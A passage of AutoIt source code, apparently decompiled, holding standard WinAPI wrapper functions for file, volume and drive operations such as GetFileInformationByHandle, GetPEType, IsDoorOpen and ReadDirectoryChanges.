        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_GetFileID

    Func _WinAPI_GetFileInformationByHandle($hfile)
        Local $tbhfi = DllStructCreate("dword;dword[2];dword[2];dword[2];dword;dword;dword;dword;dword;dword")
        Local $acall = DllCall("kernel32.dll", "bool", "GetFileInformationByHandle", "handle", $hfile, "struct*", $tbhfi)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x8]
        $aret[0x0] = DllStructGetData($tbhfi, 0x1)
        For $i = 0x1 To 0x3
            If DllStructGetData($tbhfi, $i + 0x1) Then
                $aret[$i] = DllStructCreate($TAGFILETIME)
                _WinAPI_MoveMemory($aret[$i], DllStructGetPtr($tbhfi, $i + 0x1), 0x8)
            Else
                $aret[$i] = 0x0
            EndIf
        Next
        $aret[0x4] = DllStructGetData($tbhfi, 0x5)
        $aret[0x5] = __WinAPI_MakeQWord(DllStructGetData($tbhfi, 0x7), DllStructGetData($tbhfi, 0x6))
        $aret[0x6] = DllStructGetData($tbhfi, 0x8)
        $aret[0x7] = __WinAPI_MakeQWord(DllStructGetData($tbhfi, 0x9), DllStructGetData($tbhfi, 0xa))
        Return $aret
    EndFunc    ; -> _WinAPI_GetFileInformationByHandle

    Func _WinAPI_GetFileInformationByHandleEx($hfile)
        Local $tfi = DllStructCreate($TAGFILEINFO)
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "struct*", $tfi, "ulong", DllStructGetSize($tfi), "uint", 0x4)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $tfi
    EndFunc    ; -> _WinAPI_GetFileInformationByHandleEx

    Func _WinAPI_GetFilePointerEx($hfile)
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "int64*", 0x0, "ulong", 0x8, "uint", 0xe)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_GetFilePointerEx

    Func _WinAPI_GetFileSizeEx($hfile)
        Local $acall = DllCall("kernel32.dll", "bool", "GetFileSizeEx", "handle", $hfile, "int64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, + -1)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetFileSizeEx

    Func _WinAPI_GetFileSizeOnDisk($sfilepath)
        Local $isize = FileGetSize($sfilepath)
        If @error Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceW", "wstr", _WinAPI_PathStripToRoot(_WinAPI_GetFullPathName($sfilepath)), "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return Ceiling($isize / ($acall[0x2] * $acall[0x3])) * ($acall[0x2] * $acall[0x3])
    EndFunc    ; -> _WinAPI_GetFileSizeOnDisk

    Func _WinAPI_GetFileTitle($sfilepath)
        Local $acall = DllCall("comdlg32.dll", "short", "GetFileTitleW", "wstr", $sfilepath, "wstr", '', "word", 0x1000)
        If @error Or $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetFileTitle

    Func _WinAPI_GetFileType($hfile)
        Local $acall = DllCall("kernel32.dll", "dword", "GetFileType", "handle", $hfile)
        If @error Then Return SetError(@error, @extended, + -1)
        Local $ilasterror = _WinAPI_GetLastError()
        If Not $acall[0x0] And $ilasterror Then Return SetError(0xa, $ilasterror, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetFileType

    Func _WinAPI_GetFinalPathNameByHandle($hfile)
        Local $tfni = DllStructCreate("ulong;wchar[4096]")
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "struct*", $tfni, "ulong", DllStructGetSize($tfni), "uint", 0x9)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Local $ilength = DllStructGetData($tfni, 0x1)
        If Not $ilength Then Return SetError(0xc, 0x0, '')
        Return DllStructGetData(DllStructCreate("wchar[" & ($ilength / 0x2) & "]", DllStructGetPtr($tfni, 0x2)), 0x1)
    EndFunc    ; -> _WinAPI_GetFinalPathNameByHandle

    Func _WinAPI_GetFinalPathNameByHandleEx($hfile, $iflags = 0x0)
        Local $acall = DllCall("kernel32.dll", "dword", "GetFinalPathNameByHandleW", "handle", $hfile, "wstr", '', "dword", 0x1000, "dword", $iflags)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetFinalPathNameByHandleEx

    Func _WinAPI_GetFullPathName($sfilepath)
        Local $acall = DllCall("kernel32.dll", "dword", "GetFullPathNameW", "wstr", $sfilepath, "dword", 0x1000, "wstr", '', "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_GetFullPathName

    Func _WinAPI_GetLogicalDrives()
        Local $acall = DllCall("kernel32.dll", "dword", "GetLogicalDrives")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetLogicalDrives

    Func _WinAPI_GetObjectID($sfilepath)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tfoid = DllStructCreate("byte[16];byte[48]")
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x9009c, "ptr", 0x0, "dword", 0x0, "struct*", $tfoid, "dword", DllStructGetSize($tfoid), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Local $tguid = DllStructCreate($TAGGUID)
        _WinAPI_MoveMemory($tguid, $tfoid, 0x10)
        Return $tguid
    EndFunc    ; -> _WinAPI_GetObjectID

    Func _WinAPI_GetOverlappedResult($hfile, $toverlapped, ByRef $ibytes, $bwait = False)
        Local $acall = DllCall("kernel32.dll", "bool", "GetOverlappedResult", "handle", $hfile, "struct*", $toverlapped, "dword*", 0x0, "bool", $bwait)
        If @error Then Return SetError(@error, @extended, False)
        $ibytes = $acall[0x3]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetOverlappedResult

    Func _WinAPI_GetPEType($sfilepath)
        Local $tdata = DllStructCreate("ushort[2]")
        Local $tuint = DllStructCreate("uint", DllStructGetPtr($tdata))
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, $GENERIC_READ, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $ierror = 0x0, $ival
        Do
            Local $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x2, "dword*", 0x0, "ptr", 0x0)
            If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x2) Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            $ival = DllStructGetData($tdata, 0x1, 0x1)
            If $ival <> 0x5a4d Then
                $ierror = 0x3
                ExitLoop
            EndIf
            If Not _WinAPI_SetFilePointerEx($hfile, 0x3c) Then
                $ierror = @error + 0x28
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x4, "dword*", 0x0, "ptr", 0x0)
            If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x4) Then
                $ierror = @error + 0x32
                ExitLoop
            EndIf
            If Not _WinAPI_SetFilePointerEx($hfile, DllStructGetData($tuint, 0x1)) Then
                $ierror = @error + 0x3c
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x4, "dword*", 0x0, "ptr", 0x0)
            If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x4) Then
                $ierror = @error + 0x46
                ExitLoop
            EndIf
            $ival = DllStructGetData($tuint, 0x1)
            If $ival <> 0x4550 Then
                $ierror = 0x4
                ExitLoop
            EndIf
            $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x2, "dword*", 0x0, "ptr", 0x0)
            If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x2) Then
                $ierror = @error + 0x50
                ExitLoop
            EndIf
            $ival = DllStructGetData($tdata, 0x1, 0x1)
        Until 0x1
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $ival
    EndFunc    ; -> _WinAPI_GetPEType

    Func _WinAPI_GetProfilesDirectory()
        Local $acall = DllCall("userenv.dll", "bool", "GetProfilesDirectoryW", "wstr", '', "dword*", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_GetProfilesDirectory

    Func _WinAPI_GetTempFileName($sfilepath, $sprefix = '')
        Local $acall = DllCall("kernel32.dll", "uint", "GetTempFileNameW", "wstr", $sfilepath, "wstr", $sprefix, "uint", 0x0, "wstr", '')
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x4]
    EndFunc    ; -> _WinAPI_GetTempFileName

    Func _WinAPI_GetVolumeInformation($sroot = '')
        If Not StringStripWS($sroot, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sroot = Null
        Local $acall = DllCall("kernel32.dll", "bool", "GetVolumeInformationW", "wstr", $sroot, "wstr", '', "dword", 0x1000, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "wstr", '', "dword", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x5]
        For $i = 0x0 To 0x4
            Switch $i
            Case 0x0
                $aret[$i] = $acall[0x2]
            Case Else
                $aret[$i] = $acall[$i + 0x3]
            EndSwitch
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetVolumeInformation

    Func _WinAPI_GetVolumeInformationByHandle($hfile)
        Local $acall = DllCall("kernel32.dll", "bool", "GetVolumeInformationByHandleW", "handle", $hfile, "wstr", '', "dword", 0x1000, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "wstr", '', "dword", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x5]
        For $i = 0x0 To 0x4
            Switch $i
            Case 0x0
                $aret[$i] = $acall[0x2]
            Case Else
                $aret[$i] = $acall[$i + 0x3]
            EndSwitch
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetVolumeInformationByHandle

    Func _WinAPI_GetVolumeNameForVolumeMountPoint($smountedpath)
        Local $acall = DllCall("kernel32.dll", "bool", "GetVolumeNameForVolumeMountPointW", "wstr", $smountedpath, "wstr", '', "dword", 0x50)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetVolumeNameForVolumeMountPoint

    Func _WinAPI_IOCTL($idevicetype, $ifunction, $imethod, $iaccess)
        Return BitOR(BitShift($idevicetype, + -16), BitShift($iaccess, + -14), BitShift($ifunction, + -2), $imethod)
    EndFunc    ; -> _WinAPI_IOCTL

    Func _WinAPI_IsDoorOpen($sdrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, $GENERIC_READWRITE, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, False)
        Local $tspt = DllStructCreate("ushort Length;byte ScsiStatus;byte PathId;byte TargetId;byte Lun;byte CdbLength;byte SenseInfoLength;byte DataIn;byte Alignment[3];ulong DataTransferLength;ulon" & _
            "g TimeOutValue;ulong_ptr DataBufferOffset;ulong SenseInfoOffset;byte Cdb[16]" & (@AutoItX64  ? ";byte[4]"  : '') & ";byte Hdr[8]")
        Local $tcdb = DllStructCreate("byte;byte;byte[6];byte[2];byte;byte;byte[4]", DllStructGetPtr($tspt, "Cdb"))
        Local $thdr = DllStructCreate("byte;byte;byte[3];byte;byte[2]", DllStructGetPtr($tspt, "Hdr"))
        Local $isize = DllStructGetPtr($tspt, "Hdr") - DllStructGetPtr($tspt)
        DllStructSetData($tspt, "Length", $isize)
        DllStructSetData($tspt, "ScsiStatus", 0x0)
        DllStructSetData($tspt, "PathId", 0x0)
        DllStructSetData($tspt, "TargetId", 0x0)
        DllStructSetData($tspt, "Lun", 0x0)
        DllStructSetData($tspt, "CdbLength", 0xc)
        DllStructSetData($tspt, "SenseInfoLength", 0x0)
        DllStructSetData($tspt, "DataIn", 0x1)
        DllStructSetData($tspt, "DataTransferLength", 0x8)
        DllStructSetData($tspt, "TimeOutValue", 0x15180)
        DllStructSetData($tspt, "DataBufferOffset", $isize)
        DllStructSetData($tspt, "SenseInfoOffset", 0x0)
        DllStructSetData($tcdb, 0x1, 0xbd)
        DllStructSetData($tcdb, 0x2, 0x0)
        DllStructSetData($tcdb, 0x4, 0x0, 0x1)
        DllStructSetData($tcdb, 0x4, 0x8, 0x2)
        DllStructSetData($tcdb, 0x5, 0x0)
        DllStructSetData($tcdb, 0x6, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x4d004, "struct*", $tspt, "dword", $isize, "struct*", $tspt, "dword", DllStructGetSize($tspt), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, False)
        Return (BitAND(DllStructGetData($thdr, 0x2), 0x10) = 0x10)
    EndFunc    ; -> _WinAPI_IsDoorOpen

    Func _WinAPI_IsPathShared($sfilepath)
        If Not __dll("ntshrui.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $acall = DllCall("ntshrui.dll", "bool", "IsPathSharedW", "wstr", _WinAPI_PathRemoveBackslash($sfilepath), "int", 0x1)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsPathShared

    Func _WinAPI_IsWritable($sdrive)
        DriveGetFileSystem($sdrive)
        If @error Then Return SetError(0x28 + @error, _WinAPI_GetLastError(), 0x0)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x70024, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
        Local Const $ERROR_WRITE_PROTECT = 0x13
        If __CheckErrorCloseHandle($acall, $hfile, 0x1) <> 0xa And @extended = $ERROR_WRITE_PROTECT Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsWritable

    Func _WinAPI_LoadMedia($sdrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, $GENERIC_READ, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, False)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d480c, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadMedia

    Func _WinAPI_LockDevice($sdrive, $block)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, $GENERIC_READWRITE, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, False)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d4804, "boolean*", $block, "dword", 0x1, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LockDevice

    Func _WinAPI_LockFile($hfile, $ioffset, $ilength)
        Local $acall = DllCall("kernel32.dll", "bool", "LockFile", "handle", $hfile, "dword", _WinAPI_LoDWord($ioffset), "dword", _WinAPI_HiDWord($ioffset), "dword", _WinAPI_LoDWord($ilength), "dword", _WinAPI_HiDWord($ilength))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LockFile

    Func _WinAPI_MapViewOfFile($hmapping, $ioffset = 0x0, $ibytes = 0x0, $iaccess = 0x6)
        Local $acall = DllCall("kernel32.dll", "ptr", "MapViewOfFile", "handle", $hmapping, "dword", $iaccess, "dword", _WinAPI_HiDWord($ioffset), "dword", _WinAPI_LoDWord($ioffset), "ulong_ptr", $ibytes)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MapViewOfFile

    Func _WinAPI_MoveFileEx($sexistingfile, $snewfile, $iflags = 0x0, $pprogressproc = 0x0, $pdata = 0x0)
        If Not StringStripWS($snewfile, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $snewfile = Null
        If BitAND($iflags, $MOVE_FILE_DELAY_UNTIL_REBOOT) Then
            If $snewfile = 0x0 Then $snewfile = Null
        EndIf
        Local $acall = DllCall("kernel32.dll", "bool", "MoveFileWithProgressW", "wstr", $sexistingfile, "wstr", $snewfile, "ptr", $pprogressproc, "ptr", $pdata, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MoveFileEx

    Func _WinAPI_OpenFileById($hfile, $vid, $iaccess = 0x0, $ishare = 0x0, $iflags = 0x0)
        Local $tfidd = DllStructCreate("dword;uint;int64;int64")
        Local $hobj, $acall, $itype, $ierror = 0x0
        Select
        Case IsString($vid)
            $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $vid, "ptr", DllStructGetPtr($tfidd, 0x3))
            If @error Or $acall[0x0] Then
                Return SetError(@error + 0x1e, 0x0, 0x0)
            EndIf
            $itype = 0x1
        Case IsDllStruct($vid)
            If Not _WinAPI_MoveMemory(DllStructGetPtr($tfidd, 0x3), DllStructGetPtr($vid), 0x10) Then
                Return SetError(@error + 0x28, 0x0, 0x0)
            EndIf
            $itype = 0x1
        Case Else
            DllStructSetData($tfidd, 0x3, $vid)
            $itype = 0x0
        EndSelect
        DllStructSetData($tfidd, 0x1, DllStructGetSize($tfidd))
        DllStructSetData($tfidd, 0x2, $itype)
        If IsString($hfile) Then
            $hobj = _WinAPI_CreateFileEx($hfile, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
            If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Else
            $hobj = $hfile
        EndIf
        $acall = DllCall("kernel32.dll", "handle", "OpenFileById", "handle", $hobj, "struct*", $tfidd, "dword", $iaccess, "dword", $ishare, "ptr", 0x0, "dword", $iflags)
        If @error Or ($acall[0x0] = Ptr(+ -1)) Then $ierror = @error + 0xa
        If IsString($hfile) Then
            DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobj)
        EndIf
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenFileById

    Func _WinAPI_OpenFileMapping($sname, $iaccess = 0x6, $binherit = False)
        Local $acall = DllCall("kernel32.dll", "handle", "OpenFileMappingW", "dword", $iaccess, "bool", $binherit, "wstr", $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenFileMapping

    Func _WinAPI_PathIsDirectoryEmpty($sfilepath)
        Local $acall = DllCall("shlwapi.dll", "bool", "PathIsDirectoryEmptyW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PathIsDirectoryEmpty

    Func _WinAPI_QueryDosDevice($sdevice)
        If Not StringStripWS($sdevice, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sdevice = Null
        Local $tdata = DllStructCreate("wchar[16384]")
        Local $acall = DllCall("kernel32.dll", "dword", "QueryDosDeviceW", "wstr", $sdevice, "struct*", $tdata, "dword", 0x4000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Local $aret = _WinAPI_StructToArray($tdata)
        If IsString($sdevice) Then
            $aret = $aret[0x1]
        EndIf
        Return $aret
    EndFunc    ; -> _WinAPI_QueryDosDevice

    Func _WinAPI_ReadDirectoryChanges($hdirectory, $ifilter, $pbuffer, $ilength, $bsubtree = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "ReadDirectoryChangesW", "handle", $hdirectory, "struct*", $pbuffer, "dword", $ilength - Mod($ilength, 0x4), "bool", $bsubtree, "dword", $ifilter, "dword*", 0x0, "ptr", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Or (Not $acall[0x6]) Then Return SetError(@error + 0xa, @extended, 0x0)
        $pbuffer = $acall[0x2]
        Local $ADATA[0x65][0x2] = [[0x0]]
        Local $tfni, $ibuffer = 0x0, $ioffset = 0x0
        Do
            $ibuffer += $ioffset
            $tfni = DllStructCreate("dword NextEntryOffset;dword Action;dword FileNameLength;wchar FileName[" & (DllStructGetData(DllStructCreate("dword FileNameLength", $pbuffer + $ibuffer + 0x8), 0x1) / 0x2) & "]", $pbuffer + $ibuffer)
            __Inc($ADATA)
            $ADATA[$ADATA[0x0][0x0]][0x0] = DllStructGetData($tfni, "FileName")
            $ADATA[$ADATA[0x0][0x0]][0x1] = DllStructGetData($tfni, "Action")
            $ioffset = DllStructGetData($tfni, "NextEntryOffset")
        Until Not $ioffset
        __Inc($ADATA, + -1)
        Return $ADATA
    EndFunc    ; -> _WinAPI_ReadDirectoryChanges

    Func _WinAPI_RemoveDirectory($sdirpath)
        Local $acall = DllCall("kernel32.dll", "bool", "RemoveDirectoryW", "wstr", $sdirpath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RemoveDirectory

    Func _WinAPI_ReOpenFile($hfile, $iaccess, $ishare, $iflags = 0x0)
        Local $acall = DllCall("kernel32.dll", "handle", "ReOpenFile", "handle", $hfile, "dword", $iaccess, "dword", $ishare, "dword", $iflags)
        If @error Or ($acall[0x0] = Ptr(+ -1)) Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReOpenFile

    Func _WinAPI_ReplaceFile($sreplacedfile, $sreplacementfile, $sbackupfile = '', $iflags = 0x0)
        If Not StringStripWS($sbackupfile, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sbackupfile = Null
        Local $acall = DllCall("kernel32.dll", "bool", "ReplaceFileW", "wstr", $sreplacedfile, "wstr", $sreplacementfile, "wstr", $sbackupfile, "dword", $iflags, "ptr", 0x0, "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReplaceFile

    Func _WinAPI_SearchPath($sfilepath, $ssearchpath = '')
        If Not StringStripWS($ssearchpath, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $ssearchpath = Null
        Local $acall = DllCall("kernel32.dll", "dword", "SearchPathW", "wstr", $ssearchpath, "wstr", $sfilepath, "ptr", 0x0, "dword", 0x1000, "wstr", '', "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x5]
    EndFunc    ; -> _WinAPI_SearchPath

    Func _WinAPI_SetCompression($sfilepath, $icompression)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, $GENERIC_READWRITE, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x9c040, "ushort*", $icompression, "dword", 0x2, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_SetCompression

    Func _WinAPI_SetCurrentDirectory($sdir)
        Local $acall = DllCall("kernel32.dll", "int", "SetCurrentDirectoryW", "wstr", $sdir)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetCurrentDirectory

    Func _WinAPI_SetEndOfFile($hfile)
        Local $acall = DllCall("kernel32.dll", "bool", "SetEndOfFile", "handle", $hfile)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetEndOfFile

    Func _WinAPI_SetFileAttributes($sfilepath, $iattributes)
        Local $acall = DllCall("kernel32.dll", "int", "SetFileAttributesW", "wstr", $sfilepath, "dword", $iattributes)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetFileAttributes

    Func _WinAPI_SetFileInformationByHandleEx($hfile, $tfileinfo)
        Local $acall = DllCall("ntdll.dll", "long", "ZwSetInformationFile", "handle", $hfile, "struct*", $tfileinfo, "struct*", $tfileinfo, "ulong", DllStructGetSize($tfileinfo), "uint", 0x4)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_SetFileInformationByHandleEx

    Func _WinAPI_SetFilePointer($hfile, $ipos, $imethod = 0x0)
        Local $acall = DllCall("kernel32.dll", "INT", "SetFilePointer", "handle", $hfile, "long", $ipos, "ptr", 0x0, "long", $imethod)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetFilePointer

    Func _WinAPI_SetFilePointerEx($hfile, $ipos, $imethod = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $hfile, "int64", $ipos, "int64*", 0x0, "dword", $imethod)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetFilePointerEx

    Func _WinAPI_SetFileShortName($hfile, $sshortname)
        Local $acall = DllCall("kernel32.dll", "bool", "SetFileShortNameW", "handle", $hfile, "wstr", $sshortname)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetFileShortName

    Func _WinAPI_SetFileValidData($hfile, $ilength)
        Local $acall = DllCall("kernel32.dll", "bool", "SetFileValidData", "handle", $hfile, "int64", $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetFileValidData

    Func _WinAPI_SetSearchPathMode($iflags)
        Local $acall = DllCall("kernel32.dll", "bool", "SetSearchPathMode", "dword", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetSearchPathMode

    Func _WinAPI_SetVolumeMountPoint($sfilepath, $sguid)
        Local $acall = DllCall("kernel32.dll", "bool", "SetVolumeMountPointW", "wstr", $sfilepath, "wstr", $sguid)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetVolumeMountPoint

    Func _WinAPI_SfcIsFileProtected($sfilepath)
        If Not __dll("sfc.dll") Then Return SetError(0x67, 0x0, False)
        Local $acall = DllCall("sfc.dll", "bool", "SfcIsFileProtected", "handle", 0x0, "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SfcIsFileProtected

    Func _WinAPI_UnlockFile($hfile, $ioffset, $ilength)
        Local $acall = DllCall("kernel32.dll", "bool", "UnlockFile", "handle", $hfile, "dword", _WinAPI_LoDWord($ioffset), "dword", _WinAPI_HiDWord($ioffset), "dword", _WinAPI_LoDWord($ilength), "dword", _WinAPI_HiDWord($ilength))
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnlockFile

    Func _WinAPI_UnmapViewOfFile($paddress)
        Local $acall = DllCall("kernel32.dll", "bool", "UnmapViewOfFile", "ptr", $paddress)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnmapViewOfFile

    Func _WinAPI_Wow64EnableWow64FsRedirection($benable)
        Local $acall = DllCall("kernel32.dll", "boolean", "Wow64EnableWow64FsRedirection", "boolean", $benable)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
